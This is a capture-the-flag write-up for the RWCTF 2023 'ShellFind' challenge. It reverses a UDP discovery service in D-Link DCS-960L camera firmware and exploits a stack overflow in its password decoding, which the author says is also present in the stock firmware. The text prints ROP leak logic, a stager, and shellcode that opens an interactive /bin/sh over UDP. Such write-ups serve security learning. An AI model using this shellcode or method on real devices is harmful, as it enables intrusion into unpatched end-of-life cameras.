## [RWCTF 2023] ShellFind

Writeup by [@nneonneo](https://github.com/nneonneo).

ShellFind was a pwn challenge in Real World CTF 2023, with a score of 378 and total of six solves during the competition.

We're provided with a server to connect to, as well as a `firmware.bin` file. When we connect to the provided server, it provides a UDP port for us to contact, and no additional information.

Looking at the `firmware.bin` file in a hex editor, we can spy these strings at the end:

- `4588`
- `20191128`
- `1.9.0-2`
- `DCS-960L`
- `fwpk`

This suggests that the file is a firmware image for the D-Link DCS-960L "HD 180° Panoramic Camera". Indeed, we can download the stock 1.09.02 firmware from [the D-Link website](http://legacyfiles.us.dlink.com/DCS-960L/REVA/FIRMWARE/DCS-960L_REVA_FIRMWARE_1.09.02.zip), and confirm that it ends with the same strings. However, the stock firmware differs from the provided firmware.

Using `binwalk`, we can extract both sets of firmware; each image consists of a compressed Linux kernel image followed by a squashfs filesystem. Diffing these files, we find that only the file `/usr/sbin/ipfind` differs between the two images. Given this, and the challenge name ("ShellFind"), it seems clear that this is the service we're supposed to pwn.

### Reversing ipfind

Opening `ipfind` in Ghidra and doing a bit of reversing, we find that it is a simple UDP server. It repeatedly reads a packet from the input and parses the first 29 bytes according to a structure like this:

```c
struct header {
    char magic[4];      // must be "FIVI"
    uint32_t msg_id;    // arbitrary, echoed in the response
    uint8_t unk1;       // must be 10
    uint16_t cmd;       // 1 or 2
    uint16_t unk2;
    uint32_t ifaddr;    // ip address of the device, ignored in request
    uint8_t hwaddr[6];  // mac address of the device (must be ff ff ff ff ff ff for cmd=1 and the device's hardware address for cmd=2)
    uint16_t unk3;      // must be zero for cmd=1
    uint32_t paylen;    // must be zero for cmd=1 and 0x8e for cmd=2
} __attribute__((packed));
```

`ipfind` supports exactly two different packet types depending on the `cmd` field. `cmd = 1` ("Discovery") requests cause the device to reply with a large UDP packet 0x21d bytes in size containing a wealth of information about the device - its name, model number, version number, various configuration settings, and IP/MAC addresses. The only difference between the stock `ipfind` and the challenge `ipfind` is in this function: the stock code sends the reply to `255.255.255.255`, whereas the new code sends the reply to the original client IP address, presumably to make the proxy work properly. Indeed, if we send a properly-formatted `cmd = 1` packet to the challenge service, we get a packet like this back:

`46495649000000010b0100cc00c0a80001525400123456000000020000442d4c696e6b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004443532d3936304c0000000000000000000000000000000000000000000000004443532d3936304c0000000000000000312e392e300000000100010000004443532d3936304c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffff0000000000c0a800010000000050002a0200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000`

From this, we learn the device's IP address (192.168.0.1) and MAC address (52:54:00:12:34:56).

`cmd = 2` packets are more interesting. The handler for this packet expects an extra block of data 0x8e bytes in length to follow the header, and parses it as follows:

```c
struct cmd2data {
    char b64_username[64];
    char b64_password[64];
    short net_type; // 0 = static, 1 = DHCP
    uint32_t ip;
    uint32_t mask;
    uint32_t gateway;
} __attribute__((packed));
```

In short, this packet allows the sender to change the device's IP configuration, if the correct username and password are provided. Here's the function that verifies the provided username and password:

```
int decode_auth(byte *b64_username,byte *b64_password)
{
  int iVar1;
  int uVar2;
  char username [256];
  char password [256];
  char realpass [256];
  char realname [64];
  
  realname[0] = '\0';
  memset(realname + 1,0,0x3f);
  Base64decs(b64_username,username);
  Base64decs(b64_password,password);
  cfgRead("USER_ADMIN","Username1",realname);
  usrInit(0);
  iVar1 = usrGetGroup(username);
  uVar2 = usrGetPass(username,realpass,0x100);
  if (uVar2 == 1) {
    if (iVar1 == 0) {
      iVar1 = strcmp(realname,username);
      if (iVar1 == 0) {/
        iVar1 = strcmp(password,realpass);
        uVar2 = (int)(iVar1 != 0);
      }
    }
  }
  else {
    uVar2 = 0xffffffff;
  }
  usrFree();
  return uVar2;
}
```

Note that no length parameter is passed to `Base64decs`. This function is defined in a separate library, `/usr/lib/libFVbase64.so`. It turns out that the function performs no length checks whatsoever: it will continue to decode Base64-encoded text until it sees an `=` or `\0` byte. The `cmd = 2` handler also doesn't bother to check if the packet actually contained 0x8e bytes of payload. This makes `decode_auth` vulnerable to a trivial stack buffer overflow: provide an over-long password, and `Base64decs` will overflow the `password` variable.

Note that this is *not* an introduced vulnerability for this challenge: the bug is present in the stock binary. I guess this makes the bug a zero-day - and the device is EoL, so presumably it will be vulnerable forever. Gotta love crappy IoT devices!

### Exploiting ipfind

Since this is a crappy IoT device with barely any security, there is no PIE and no canaries, and the stack is executable. Unfortunately, after several attempts to guess stack addresses on the remote server for shellcode execution, we concluded that ASLR was most likely enabled. Furthermore, since it's MIPS (fixed-width 32-bit instructions), the binary doesn't have great ROP gadgets. The binary imports `system`, so we considered ROPping to call `system`; although we got this to work, we found that we could not make any outbound TCP requests using e.g. `curl` or `wget` on the remote server, and could not work out how to create a suitable UDP-based exfiltration system using `sh` commands. Note that, in order to use `write` on the UDP socket, we would have to call `connect()`, but this would require some form of ROP as well as knowing the IP/port to connect to.

However, both the `cmd = 1` and `cmd = 2` handlers send back replies at the end of processing, so we can ROP to the reply code in order to leak memory via the `sendto` reply. Because we're using UDP packets, we're limited in the amount of data we can send, which limits the length of our ROP chain, so we simply return into the main function's `recvfrom` loop so we can repeatedly exploit the server.

Specifically, the `sendto` call in the `cmd = 2` handler looks like this:

```
00401694 8f bc 00 18       lw               gp,local_40(sp)
00401698 ae 02 00 04       sw               v0,0x4(s0)=>client_addr.sin_addr.s_addr
0040169c 8f 82 80 b8       lw               v0,-0x7f48(gp)=>->server_sockfd                          = 00413134
004016a0 8c 44 00 00       lw               a0,0x0(v0)=>server_sockfd                                = ??
004016a4 af b0 00 10       sw               s0=>client_addr,local_48(sp)
004016a8 24 02 00 10       li               v0,0x10
004016ac af a2 00 14       sw               v0,local_44(sp)
004016b0 27 a5 00 24       addiu            a1,sp,0x24
004016b4 24 06 00 1d       li               a2,0x1d
004016b8 8f 99 80 90       lw               t9,-0x7f70(gp)=>-><EXTERNAL>::sendto                     = 00402940
004016bc 03 20 f8 09       jalr             t9=><EXTERNAL>::sendto
004016c0 00 00 38 21       _clear           a3
```

We found gadgets that can be chained to control `a0` (`fd`) and `a1` (`buf`), and we can control the final two arguments (`addr` and `addrlen`) as they are passed on the stack. We can guess the appropriate `fd` (it's always 3), and we can simply place the address of `client_addr` (in BSS) and the address length (0x10) on the stack of our ROP. However, `a2` (`len`) and `a3` (`flags`) are harder to control, and the default values we get are not useful (`a2` = 0 and `a3` = some pointer value). Thus, we return to `0x4016b4`, which sets `a2` to 0x1d and `a3` to 0, letting us leak 0x1d bytes from anywhere we want in memory.

In this way, we can leak part of the BSS, which conveniently contains a copy of `argv[1]` (a stack address) in the `ifname` variable, and thus leak a stack address and break ASLR. However, we found that as part of ASLR, the remote server also pads the stack with a random 16-byte-aligned offset between the arguments and the first stack frame. Thus, we perform a second leak to obtain the stack offset: we target a fixed distance below the obtained argv pointer, and use the leaked contents to guess the stack offset. By deliberately padding our transmitted packet with a `pwn.cyclic` pattern, we can significantly increase our chances of identifying the right offset.

Finally, all we have to do is stick some shellcode on the stack (as part of our received packet) and jump to it, since the stack is executable. Since we're still limited to complete UDP packets, our first packet (which needs to include a stack BOF payload) will include a short stager shellcode, which then receives a larger second shellcode. We compiled both with Binary Ninja's shellcode compiler (`scc`).

The first shellcode ([`stager.c`](stager.c), [`stager`](stager)):

```c
int main() {
    int *server_sockfd = (int *)0x413134;
    struct sockaddr *client_addr = (struct sockaddr *)0x413170;
    sendto(*server_sockfd, "OK", 2, 0, client_addr, 0x10);
    char buf[1400];
    socklen_t addrlen = 0x10;
    recvfrom(*server_sockfd, buf, sizeof(buf), 0, client_addr, &addrlen);
    void (*fn)(void) = (void (*)(void))buf;
    fn();
}
```

The second shellcode ([`shellcode.c`](shellcode.c), [`shellcode`](shellcode)) implements a full UDP proxy to `/bin/sh -i` and weighs in at 1224 bytes:

```c
int main() {
    int *server_sockfd = (int *)0x413134;
    struct sockaddr *client_addr = (struct sockaddr *)0x413170;
    int si[2], so[2];
    pipe(si);
    pipe(so);
    if(!fork()) {
        dup2(si[0], 0);
        dup2(so[1], 1);
        dup2(so[1], 2);
        char *args[3];
        args[0] = "/bin/sh";
        args[1] = "-i";
        args[2] = NULL;
        execve("/bin/sh", args, NULL);
        exit(1);
    }
    char buf[1024];
    if(!fork()) {
        socklen_t addrlen = 0x10;
        while(1) {
            int sz = recvfrom(*server_sockfd, buf, sizeof(buf), 0, client_addr, &addrlen);
            if(sz >= 0) {
                write(si[1], buf, sz);
            } else {
                break;
            }
        }
    } else {
        while(1) {
            int sz = read(so[0], buf, sizeof(buf));
            if(sz >= 0) {
                sendto(*server_sockfd, buf, sz, 0, client_addr, 0x10);
            } else {
                break;
            }
        }
    }
}
```

With the final shellcode loaded into memory, we have a fully interactive shell, which we can finally use to browse the filesystem and read the contents of `/firmadyne/flag`: `rwctf{Find_udp_servic3_ORI_bind_U_h3r3_baby}`.

The full contents of our exploit script can be found in [`exploit.py`](exploit.py).
